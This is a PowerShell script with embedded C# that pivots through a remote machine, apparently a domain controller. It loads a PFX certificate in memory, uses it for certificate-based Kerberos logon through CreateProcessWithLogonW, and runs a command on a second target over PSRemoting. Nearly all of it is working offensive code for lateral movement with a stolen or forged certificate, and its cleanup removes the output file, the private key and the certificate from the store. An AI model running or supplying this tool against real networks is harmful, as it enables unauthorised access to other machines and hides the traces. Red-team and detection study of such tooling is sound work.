<#
.SYNOPSIS
    Pivot through a remote machine using a PFX certificate over PSRemoting.
    PFX transferred as base64 in memory. Private key container is explicitly
    deleted on cleanup (CNG or CAPI), and cleanup runs even if the pivot fails.

.PARAMETER PfxPath
    Path to the PFX file on your local machine.

.PARAMETER DC
    The machine to pivot through (e.g. DC01).

.PARAMETER Domain
    The AD domain name (e.g. CORP.LOCAL).

.PARAMETER Target
    The target machine to reach via the pivot.

.PARAMETER Command
    Command to execute on the target machine.
    Default: "whoami; hostname"

.EXAMPLE
    .\Invoke-PivotWithCert.ps1 -PfxPath admin.pfx -DC DC01 -Domain CORP.LOCAL -Target SRV01

.EXAMPLE
    .\Invoke-PivotWithCert.ps1 -PfxPath admin.pfx -DC DC01 -Domain CORP.LOCAL -Target SRV01 -Command "ipconfig /all"
#>

param(
    [Parameter(Mandatory)] [string]$PfxPath,
    [Parameter(Mandatory)] [string]$DC,
    [Parameter(Mandatory)] [string]$Domain,
    [Parameter(Mandatory)] [string]$Target,
    [string]$Command = "whoami; hostname"
)

$pfxB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($PfxPath))
Write-Host "[*] PFX loaded and base64 encoded ($([math]::Round($pfxB64.Length/1024))KB)" -ForegroundColor Cyan

Invoke-Command -ComputerName $DC -ScriptBlock {
    param($b64, $dom, $target, $cmd)

    $pfxBytes = [Convert]::FromBase64String($b64)

    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class RunAsWithCert
{
    const int LOGON_NETCREDENTIALS_ONLY = 2;
    const int CREATE_NEW_CONSOLE = 0x00000010;

    // Exposed so PowerShell can read the thumbprint without loading the PFX again
    public static string LastThumbprint;

    public enum CRED_MARSHAL_TYPE { CertCredential = 1, UsernameTargetCredential }

    [StructLayout(LayoutKind.Sequential)]
    struct CERT_CREDENTIAL_INFO
    {
        public uint cbSize;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
        public byte[] rgbHashOfCert;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CreateProcessWithLogonW(
        String lpUsername, String lpDomain, String lpPassword,
        uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CredFree(IntPtr buffer);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CredMarshalCredential(
        CRED_MARSHAL_TYPE CredType, IntPtr Credential, out IntPtr MarshaledCredential);

    public static int RunFromBytes(byte[] pfxBytes, string domain, string command)
    {
        X509Certificate2 cert = new X509Certificate2(pfxBytes, "", X509KeyStorageFlags.PersistKeySet);
        LastThumbprint = cert.Thumbprint;

        Console.WriteLine("[*] Subject : " + cert.Subject);
        Console.WriteLine("[*] Issuer  : " + cert.Issuer);
        Console.WriteLine("[*] UPN     : " + cert.GetNameInfo(X509NameType.UpnName, false));
        Console.WriteLine("[*] Thumb   : " + cert.Thumbprint);

        using (X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser))
        {
            store.Open(OpenFlags.ReadWrite);
            store.Add(cert);
        }

        CERT_CREDENTIAL_INFO certInfo = new CERT_CREDENTIAL_INFO();
        certInfo.cbSize = (uint)Marshal.SizeOf(typeof(CERT_CREDENTIAL_INFO));
        certInfo.rgbHashOfCert = cert.GetCertHash();

        IntPtr pCertInfo = Marshal.AllocHGlobal(Marshal.SizeOf(certInfo));
        Marshal.StructureToPtr(certInfo, pCertInfo, false);

        IntPtr mc = IntPtr.Zero;
        if (!CredMarshalCredential(CRED_MARSHAL_TYPE.CertCredential, pCertInfo, out mc))
            throw new Exception("CredMarshalCredential failed: 0x" + Marshal.GetLastWin32Error().ToString("X"));

        string username = Marshal.PtrToStringUni(mc);
        Marshal.FreeHGlobal(pCertInfo);
        CredFree(mc);

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);

        if (!CreateProcessWithLogonW(username, domain, null, LOGON_NETCREDENTIALS_ONLY,
            null, command, CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
            throw new Exception("CreateProcessWithLogonW failed: 0x" + Marshal.GetLastWin32Error().ToString("X"));

        Console.WriteLine("[+] Process spawned (PID: " + pi.dwProcessId + ")");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return (int)pi.dwProcessId;
    }
}
'@

    $outFile = "C:\Temp\purple-$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"

    try {
        $pivotCmd = "powershell.exe -NoProfile -c `"Invoke-Command -ComputerName $target -ScriptBlock { $cmd } | Out-File '$outFile' -Encoding UTF8 2>&1`""

        Write-Host "`n[*] Spawning PKINIT process on $env:COMPUTERNAME..." -ForegroundColor Cyan
        $spawnedPid = [RunAsWithCert]::RunFromBytes($pfxBytes, $dom, $pivotCmd)

        Write-Host "[*] Waiting for command to complete..." -ForegroundColor Gray
        $waited = 0
        while ($waited -lt 30) {
            Start-Sleep 2
            $waited += 2
            if (Test-Path $outFile) {
                Start-Sleep 1
                break
            }
        }

        Write-Host "`n--- Output from $target ---" -ForegroundColor Green
        if (Test-Path $outFile) {
            Get-Content $outFile
        } else {
            Write-Host "[-] No output after ${waited}s. Process may still be running (PID: $spawnedPid)" -ForegroundColor Yellow
        }
    }
    finally {
        # ---- Cleanup runs even if the pivot threw (unreachable target, PKINIT reject, etc.) ----

        if (Test-Path $outFile) {
            Remove-Item $outFile -Force -ErrorAction SilentlyContinue
        }

        # Thumbprint from C# static field - no second PFX load, so no container B
        $thumbprint = [RunAsWithCert]::LastThumbprint

        if ($thumbprint) {
            $store = New-Object Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
            $store.Open("ReadWrite")
            $found = $store.Certificates.Find("FindByThumbprint", $thumbprint, $false)

            if ($found.Count -gt 0) {
                $cert = $found[0]

                # Delete private key container A. Call the extension method STATICALLY -
                # $cert.GetRSAPrivateKey() does not resolve as an instance method on PS 5.1.
                try {
                    $rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert)
                    if ($rsa -is [System.Security.Cryptography.RSACng]) {
                        $rsa.Key.Delete()                                 # CNG  -> %APPDATA%\Microsoft\Crypto\Keys\
                        Write-Host "[*] CNG private key deleted" -ForegroundColor Gray
                    } elseif ($rsa -is [System.Security.Cryptography.RSACryptoServiceProvider]) {
                        $rsa.PersistKeyInCsp = $false; $rsa.Clear()       # CAPI -> %APPDATA%\Microsoft\Crypto\RSA\<SID>\
                        Write-Host "[*] CAPI private key deleted" -ForegroundColor Gray
                    } else {
                        # Not RSA - try ECDSA (EC PFX returns null from GetRSAPrivateKey)
                        $ec = [System.Security.Cryptography.X509Certificates.ECDsaCertificateExtensions]::GetECDsaPrivateKey($cert)
                        if ($ec -is [System.Security.Cryptography.ECDsaCng]) {
                            $ec.Key.Delete()
                            Write-Host "[*] ECDSA (CNG) private key deleted" -ForegroundColor Gray
                        } else {
                            Write-Host "[-] No deletable private key handle resolved" -ForegroundColor Yellow
                        }
                    }
                } catch {
                    Write-Host "[-] Key delete failed: $($_.Exception.Message)" -ForegroundColor Yellow
                }

                # store.Remove is OUTSIDE the key-delete try, so a key-delete failure
                # can't strand the cert in the store as well.
                $store.Remove($cert)
                Write-Host "[*] Cert removed from store (thumbprint: $thumbprint)" -ForegroundColor Gray
            }
            $store.Close()
        }
    }

} -ArgumentList $pfxB64, $Domain, $Target, $Command